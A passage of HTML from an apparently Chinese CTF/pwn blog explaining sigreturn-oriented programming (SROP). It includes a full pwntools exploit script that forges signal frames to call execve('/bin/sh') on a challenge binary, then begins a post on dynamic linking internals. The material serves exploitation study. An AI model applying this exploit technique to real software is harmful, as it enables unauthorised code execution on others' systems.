class="keyword">unsigned</span> <span class="keyword">short</span> gs, __gsh;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> fs, __fsh;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> es, __esh;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> ds, __dsh;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> edi;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> esi;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> ebp;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> esp;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> ebx;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> edx;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> ecx;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> eax;	</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> trapno;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> err;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> eip;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> cs, __csh;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> eflags;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> esp_at_signal;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> ss, __ssh;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> * <span class="title">fpstate</span>;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> oldmask;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> cr2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>x64</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* FPU environment matching the 64-bit FXSAVE layout.  */</span></span><br><span class="line">  <span class="keyword">__uint16_t</span>        cwd;</span><br><span class="line">  <span class="keyword">__uint16_t</span>        swd;</span><br><span class="line">  <span class="keyword">__uint16_t</span>        ftw;</span><br><span class="line">  <span class="keyword">__uint16_t</span>        fop;</span><br><span class="line">  <span class="keyword">__uint64_t</span>        rip;</span><br><span class="line">  <span class="keyword">__uint64_t</span>        rdp;</span><br><span class="line">  <span class="keyword">__uint32_t</span>        mxcsr;</span><br><span class="line">  <span class="keyword">__uint32_t</span>        mxcr_mask;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">fpxreg</span>    _<span class="title">st</span>[8];</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">xmmreg</span>    _<span class="title">xmm</span>[16];</span></span><br><span class="line">  <span class="keyword">__uint32_t</span>        padding[<span class="number">24</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">__uint64_t</span> r8;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r9;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r10;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r11;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r12;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r13;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r14;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r15;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rdi;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rsi;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rbp;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rbx;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rdx;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rax;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rcx;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rsp;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rip;</span><br><span class="line">  <span class="keyword">__uint64_t</span> eflags;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> cs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> gs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> fs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> __pad0;</span><br><span class="line">  <span class="keyword">__uint64_t</span> err;</span><br><span class="line">  <span class="keyword">__uint64_t</span> trapno;</span><br><span class="line">  <span class="keyword">__uint64_t</span> oldmask;</span><br><span class="line">  <span class="keyword">__uint64_t</span> cr2;</span><br><span class="line">  __extension__ <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> * <span class="title">fpstate</span>;</span></span><br><span class="line">      <span class="keyword">__uint64_t</span> __fpstate_word;</span><br><span class="line">    &#125;;</span><br><span class="line">  <span class="keyword">__uint64_t</span> __reserved1 [<span class="number">8</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>每一次在请求signal后，signal handler执行前，程序<strong>都会</strong>在栈上构建这个栈帧</p>
<p>如果栈溢出的数据可以覆盖它的话，就可以进行伪造，欺骗程序</p>
<hr>
<h2 id="深入理解SROP"><a href="#深入理解SROP" class="headerlink" title="深入理解SROP"></a>深入理解SROP</h2><p>先看一个例子：（通过修改Signal Frame来控制syscall）</p>
<img src="/2021/12/29/SignalFrame%E5%88%86%E6%9E%90/1640706807303.png" class width="1640706807303"> 
<p>伪造 <strong>rdi</strong> 为“/bin/sh”，伪造 <strong>rip</strong> 为syscall，伪造 <strong>rax</strong> 为“59”（execve）</p>
<p>这样的话，程序在结束signal handler，执行<strong>sigreturn</strong>的时候，就可以控制 <strong>rip</strong> 指向syscall，然后根据调用号 “59” 执行系统调用execve</p>
<p>当然也可以伪造“syscall；ret”形成<strong>system call chains</strong>：</p>
<img src="/2021/12/29/SignalFrame%E5%88%86%E6%9E%90/1640707274321.png" class width="1640707274321"> 
<p>syscall执行完成过后，就可以通过ret控制ip指针指向栈顶元素（类似于gadgets）</p>
<p>SROP需要以下条件：</p>
<ol>
<li>攻击者可以通过stack overflow等漏洞控制栈上的内容</li>
<li>需要知道栈的地址（比如需要知道自己构造的字符串<code>/bin/sh</code>的地址）</li>
<li>需要知道<code>syscall</code>指令在内存中的地址</li>
<li>需要知道<code>sigreturn</code>系统调用的内存地址</li>
</ol>
<p>接着我们就看一下那道设计巧妙的题目吧：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 <span class="title">start</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *retaddr; <span class="comment">// [rsp+0h] [rbp+0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> sys_read(<span class="number">0</span>, &amp;retaddr, <span class="number">0x400</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00000000004000B</span>0 ; <span class="function"><span class="keyword">signed</span> __int64 <span class="title">start</span><span class="params">()</span></span></span><br><span class="line"><span class="function">.text:00000000004000B0                 <span class="keyword">public</span> start</span></span><br><span class="line"><span class="function">.text:00000000004000B0 start           proc near               </span>; DATA XREF: LOAD:<span class="number">0000000000400018</span>↑o</span><br><span class="line">.text:<span class="number">00000000004000B</span>0                 <span class="keyword">xor</span>     rax, rax</span><br><span class="line">.text:<span class="number">00000000004000B</span>3                 mov     edx, <span class="number">400</span>h       ; count</span><br><span class="line">.text:<span class="number">00000000004000B</span>8                 mov     rsi, rsp        ; buf</span><br><span class="line">.text:<span class="number">00000000004000B</span>B                 mov     rdi, rax        ; fd</span><br><span class="line">.text:<span class="number">00000000004000B</span>E                 syscall                 ; LINUX - sys_read</span><br><span class="line">.text:<span class="number">00000000004000</span>C0                 retn</span><br><span class="line">.text:<span class="number">00000000004000</span>C0 start           endp</span><br><span class="line">.text:<span class="number">00000000004000</span>C0</span><br><span class="line">.text:<span class="number">00000000004000</span>C0 _text           ends</span><br></pre></td></tr></table></figure>
<p>原汇编代码就相当于<strong>“read（rax，rsp，0x400）”</strong>，直接在栈顶写入数据</p>
<p>​        //注意：read的写入的位置并不是<strong>真正的</strong>rsp，而是对rsi进行赋值时的rsp指向的位置，所以syscall构建栈帧来保存上下文的过程不会受read的影响</p>
<p>源程序就是用汇编写的，只有一个函数，程序使用statically（没有got表）</p>
<p>经过分析可以发现3个问题：</p>
<p>问题一，没有“/bin/sh”：</p>
<p>本程序没有“/bin/sh”，所以需要用“read”在某个地址上写入“/bin/sh”</p>
<p>栈地址是不确定的，所以需要用“write”泄露用于写入“/bin/sh”栈地址</p>
<p>问题二，怎么修改rax：</p>
<p>想要syscall调用“write”，必须先要把rax填入“1”，而寄存器和栈空间完全就是两个东西，那么这么通过栈来控制寄存器呢？</p>
<p>整个程序就只有一个“syscall”函数，它第一次执行时调用“read”，而“read”的返回值就装在“rax”中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、如果读取成功，则返回实际读到的字节数。这里又有两种情况：一是如果在读完count要求字节之前已经到达文件的末尾，那么实际返回的字节数将小于count值，但是仍然大于<span class="number">0</span>；二是在读完count要求字节之前，仍然没有到达文件的末尾，这是实际返回的字节数等于要求的count值。</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、如果读取时已经到达文件的末尾，则返回<span class="number">0</span>。</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>、如果出错，则返回－<span class="number">1</span>。</span><br></pre></td></tr></table></figure>
<p>那么，先要rax为“1”，函数“read”的实际写入长度必须为“1”</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00000000004000B</span>0                 <span class="keyword">xor</span>     rax, rax</span><br></pre></td></tr></table></figure>
<p>而且这段汇编代码会把rax中的值改为“0”，所以必须让过……</p>
<p>所以“send(‘\xb3’)”是最佳选择，覆盖“0x4000B0”最后一字节为“0xb3”，跳过了它，并且长度为“1”</p>
<p>接下来就会执行<strong>“write（1，rsp，0x400）”</strong>，泄露stack_addr</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">start_addr = <span class="number">0x00000000004000B0</span></span><br><span class="line">payload = p64(start_addr) * <span class="number">3</span> <span class="comment">#start_addr压栈3次，程序总共会执行4次</span></span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.send(<span class="string">&#x27;\xb3&#x27;</span>)</span><br><span class="line">stack_addr = u64(sh.recv()[<span class="number">8</span>:<span class="number">16</span>])</span><br><span class="line">log.success(<span class="string">&#x27;leak stack addr :&#x27;</span> + <span class="built_in">hex</span>(stack_addr))</span><br></pre></td></tr></table></figure>
<img src="/2021/12/29/SignalFrame%E5%88%86%E6%9E%90/1640529781412.png" class width="1640529781412"> 
<p>第一次read时：在rsp写入“4000B0” * 3，同时read返回时“pop”掉一个，程序返回到“start_addr” </p>
<img src="/2021/12/29/SignalFrame%E5%88%86%E6%9E%90/1640529918052.png" class width="1640529918052"> 
<p>第二次read时：在rsp写入“\xb3”，改写rsp为“0x4000B3”，程序返回到“start_addr+1”</p>
<p>第三次就直接执行write了</p>
<p>问题三，SROP到底怎么利用：</p>
<p>其实pwntool中有专门用来攻击<strong>srop</strong>的工具：<strong>SigreturnFrame</strong></p>
<p>和ROP模块一样，可以自动获取程序中的gadgets</p>
<p>完整exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">small = ELF(<span class="string">&#x27;./SROP&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./SROP&#x27;</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">syscall_ret = <span class="number">0x00000000004000BE</span></span><br><span class="line">start_addr = <span class="number">0x00000000004000B0</span></span><br><span class="line">payload = p64(start_addr) * <span class="number">3</span></span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">sh.send(<span class="string">&#x27;\xb3&#x27;</span>)</span><br><span class="line">stack_addr = u64(sh.recv()[<span class="number">8</span>:<span class="number">16</span>])</span><br><span class="line">log.success(<span class="string">&#x27;leak stack addr :&#x27;</span> + <span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line"><span class="comment">#SigreturnFrame模块，触发条件：只要rt_sigreturn的时候栈顶是SigreturnFrame就行</span></span><br><span class="line">sigframe.rax = constants.SYS_read	 	 <span class="comment">#控制rax为‘read’的调用号</span></span><br><span class="line">sigframe.rdi = <span class="number">0</span>				 <span class="comment">#控制各个参数</span></span><br><span class="line">sigframe.rsi = stack_addr			 </span><br><span class="line">sigframe.rdx = <span class="number">0x400</span>				 </span><br><span class="line">sigframe.rsp = stack_addr			 <span class="comment">#控制rsp为stack_addr（栈转移）</span></span><br><span class="line">sigframe.rip = syscall_ret			 <span class="comment">#控制rip为syscall_ret（但只会执行ret）</span></span><br><span class="line">payload = p64(start_addr) + <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> + <span class="built_in">str</span>(sigframe)<span class="comment">#构建signal frame（SYS_read）</span></span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">sigreturn = p64(syscall_ret) + <span class="string">&#x27;b&#x27;</span> * <span class="number">7</span><span class="comment">#读入15个字符，read控制rax为15</span></span><br><span class="line">sh.send(sigreturn)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">程序在识别到syscall后，首先构建新的栈帧保存上下文，然后调用sys_read在原来的栈空间中写入payload，sys_read执行完成后会ret栈顶的sigreturn，把新构建的栈帧pop出来，接着在程序最后执行的ret会控制IP指向‘start_addr’，然后程序重新执行</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">重复上述操作，在栈空间中压入‘syscall_ret’（因为ret会使rsp+8，所以‘syscall_ret’其实写入了&#x27;aaaaaaaa&#x27;的位置），并在最后一个ret的时候控制IP指向它</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">程序在识别到syscall后，发现rax为15所以执行sigreturn，并且其后正好就是sigframe满足了SigreturnFrame模块的条件（即使sigframe被&#x27;bbbbbbb&#x27;覆盖了一部分也不影响），sigreturn会根据sigframe来设置寄存器的值，控制IP指向syscall_ret，执行sys_read（伪）</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_execve</span><br><span class="line">sigframe.rdi = stack_addr + <span class="number">0x120</span>  </span><br><span class="line">sigframe.rsi = <span class="number">0x0</span></span><br><span class="line">sigframe.rdx = <span class="number">0x0</span></span><br><span class="line">sigframe.rsp = stack_addr</span><br><span class="line">sigframe.rip = syscall_ret</span><br><span class="line"></span><br><span class="line">frame_payload = p64(start_addr) + <span class="string">&#x27;c&#x27;</span> * <span class="number">8</span> + <span class="built_in">str</span>(sigframe)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">len</span>(frame_payload)</span><br><span class="line">payload = frame_payload + (<span class="number">0x120</span> - <span class="built_in">len</span>(frame_payload)) * <span class="string">&#x27;\x00&#x27;</span> + <span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"><span class="comment">#通过SYS_read在stack_addr+0x120写入&#x27;/bin/sh\x00&#x27;，顺便构建signal frame（SYS_execve）</span></span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.send(sigreturn)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">在之前的操作中已经更换了寄存器的数据，所以payload会被写入‘stack_addr’，在‘stack_addr’之中构建sigframe并且在‘stack_addr + 0x120’中写入&#x27;/bin/sh\x00&#x27;，在sys_read（伪）结束以后的ret会控制IP指向‘start_addr’</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">重新执行程序后，寄存器&#x27;rax,rdi,rsi,rdx&#x27;被重置，因为‘start_addr’被pop出栈，所以sigreturn会写入&#x27;cccccccc&#x27;的位置，和上文一样了，SigreturnFrame模块的条件满足</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>总结：</p>
<p><strong>SROP</strong>的实现很大程度上依靠SigreturnFrame模块，使用这个模块只需要保证sigreturn执行时的栈顶是SigreturnFrame就可以了</p>
<p>所以需要先构建signal frame，然后再合适的时机调用sigreturn</p>
<p>syscall本身压栈的sigreturn难以被利用，所以我们常常改写“rax”为“15”，以<strong>主动调用</strong>sigreturn，比如：通过read函数的返回值改写“rax”，通过“pop rax”指令来改写“rax”</p>
<p><strong>SROP</strong>也较为灵活，因为可以改写的寄存器很多，栈转移等操作都可以在SROP的附庸中实现</p>
<p>扩展：<a target="_blank" rel="noopener" href="https://2cto.com/article/201512/452080.html">https://2cto.com/article/201512/452080.html</a></p>
<hr>
<h2 id="SROP和传统ROP的对比"><a href="#SROP和传统ROP的对比" class="headerlink" title="SROP和传统ROP的对比"></a>SROP和传统ROP的对比</h2><p><strong>一般ROP</strong></p>
<p>ROP的攻击方式比较普遍，安全防护相应的也比较多 </p>
<p>ROP极大的依赖于栈结构，gadgets片段都是保存在stack上，所以在一次利用结束后，在stack发生改变的时候，很难再次利用 </p>
<p><strong>SROP和攻击</strong></p>
<p>采用SROP进行攻击，需要的gadgets少</p>
<p>每次只需要伪造对应的Frame，sigreturn的调用都能够强制切换到我们需要的状态，有着极高的代码复用性 </p>
<p><strong>两者对比</strong></p>
<p>综合考虑，SROP明显优于ROP，首先SROP是需要利用的gadgets比ROP少，接着就是代码复用性高，只要有syscall随时都可以控制程序执行系统调用，而ROP还需要考虑程序中是否有现成的system函数，如果没有，则需要通过DynELF，LibcSearcher等各种方法到libc中获取system</p>
<p>但SROP的普遍性却不如ROP，SROP需要syscall，如果程序中压根就没有syscall当然就用不了SROP，并且伪造Signal Frame需要相当长的栈空间（至少248字节），如果栈溢出的字节数过少也用不了SROP（SROP的条件非常苛刻）</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/12/23/dl-runtime-resolve%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/12/23/dl-runtime-resolve%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">dl_runtime_resolve源码分析</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2021-12-23 09:52:59" itemprop="dateCreated datePublished" datetime="2021-12-23T09:52:59+08:00">2021-12-23</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-01-04 16:32:35" itemprop="dateModified" datetime="2022-01-04T16:32:35+08:00">2022-01-04</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/SourceCodeAnalysis/" itemprop="url" rel="index"><span itemprop="name">SourceCodeAnalysis</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>15k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>14 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="dl-runtime-resolve源码分析"><a href="#dl-runtime-resolve源码分析" class="headerlink" title="dl_runtime_resolve源码分析"></a>dl_runtime_resolve源码分析</h2><p><strong>————深入理解ret2dlresolve</strong></p>
<p><strong>ret2dlresolve</strong>是一种高级的ROP技巧，目前我只是见识了一下题目</p>
<p>于是想通过分析 <strong>_dl_runtime_resolve</strong> 来搞懂 <strong>ret2dlresolve</strong> 的攻击核心点</p>
<hr>
<h2 id="前言-链接器-amp-重定位"><a href="#前言-链接器-amp-重定位" class="headerlink" title="前言-链接器&amp;重定位"></a>前言-链接器&amp;重定位</h2><p>一般C语言程序到机器语言需要经过以下这些步骤：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">预处理 -&gt; 编译 -&gt; 汇编 -&gt; 链接 </span><br></pre></td></tr></table></figure>
<p>C语言代码经过编译以后，并没有生成最终的可执行文件（exe 文件），而是生成了一种叫做<strong>目标文件</strong>（Object File）的中间文件</p>
<p>可重定位目标文件，是<strong>目标文件</strong>的一种，它里面的代码与数据，都是各个文件<strong>独立</strong>的代码与数据 </p>
<p>需要“链接”这个过程使它们建立联系并融合，而“链接”这个过程由链接器来完成</p>
<p><strong>链接：</strong></p>
<p>其实就是一个“打包”的过程，它将所有二进制形式的目标文件和系统组件<strong>组合</strong>成一个可执行文件（各个目标文件就会融合为一个可执行文件）</p>
<p><strong>链接器：</strong></p>
<p>1.符合解析：链接器会将重定位条目中的 <strong>所有引用</strong> 与 <strong>符号表中的符号</strong> 关联起来(这个符号可能在同一个可重定位目标文件中，也可能在其他可重定位目标文件中) </p>
<p>2.文件合并：将所有目标文件的同类型段<strong>合并</strong></p>
<p>3.重定位：当所有目标文件合并完毕后，其各个段的地址都会有<strong>偏移</strong>，数据段和代码段中的<strong>相对地址</strong>都被链接器修正为<strong>最终的内存位置</strong>，这样所有的变量以及函数都确定了其各自位置 </p>
<p>参考：</p>
<p>链接器：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_37375427/article/details/84947071">https://blog.csdn.net/qq_37375427/article/details/84947071</a></p>
<p>可重定位目标文件：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45109990/article/details/103397772">https://blog.csdn.net/qq_45109990/article/details/103397772</a></p>
<p>重定位：<a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000016433947">https://segmentfault.com/a/1190000016433947</a></p>
<hr>
<h2 id="前言-GUN链接器-ld"><a href="#前言-GUN链接器-ld" class="headerlink" title="前言-GUN链接器(ld)"></a>前言-GUN链接器(ld)</h2><p>特点：</p>
<p>解决程序内部跨文件引用的<strong>链接时重定位</strong></p>
<p>引用外部库文件的<strong>装载时重定位</strong>（为了加快加载速度还使用了<strong>延迟绑定</strong>）</p>
<p>链接时重定位（静态链接）：在逻辑地址转换为物理地址的过程中，地址变换是在进程装入时<strong>一次完成</strong>的，以后不再改变 </p>
<p>装载时重定位（动态链接）：动态运行的装入程序把转入模块装入内存之后，并不立即把装入模块的逻辑地址进行转换，而是把这种地址转换<strong>推迟到程序执行时</strong>才进行，装入内存后的所有地址都仍是逻辑地址，这种方式需要寄存器的支持，其中放有当前正在执行的程序在内存空间中的起始地址</p>
<p>参考：</p>
<p>装载时重定位：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/317478523">https://zhuanlan.zhihu.com/p/317478523</a></p>
<p>装载时重定位：<a target="_blank" rel="noopener" href="https://blog.csdn.net/parallelyk/article/details/42747239">https://blog.csdn.net/parallelyk/article/details/42747239</a></p>
<hr>
<h2 id="ELF结构-dynamic-段"><a href="#ELF结构-dynamic-段" class="headerlink" title="ELF结构- dynamic 段"></a>ELF结构- dynamic 段</h2><p>dynamic段是<strong>动态链接</strong>中最重要的段，它记录了和动态链接有关的段的类型，地址或者数值，指向了与动态链接相关的段 </p>
<p>dynamic段包含了以下结构的一个数组：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">Elf32_Sword d_tag;<span class="comment">//如果是64位系统就改为Elf64</span></span><br><span class="line">      <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">          Elf32_Sword d_val;<span class="comment">//那些Elf32_Word object描绘了具有不同解释的整形变量</span></span><br><span class="line">          Elf32_Addr d_ptr;<span class="comment">//那些Elf32_Word object描绘了程序的虚拟地址</span></span><br><span class="line">      &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> Elf32_Dyn _DYNAMIC[];</span><br></pre></td></tr></table></figure>
<p><strong>Elf_Dyn结构体</strong>由一个类型值加上一个附加的数值或指针组成 </p>
<p>对每一个有该类型的object，d_tag控制着d_un的解释</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center"><code>d_tag</code>类型</th>
<th style="text-align:center"><code>d_un</code>的定义</th>
</tr>
</thead>
<tbody>
<tr>
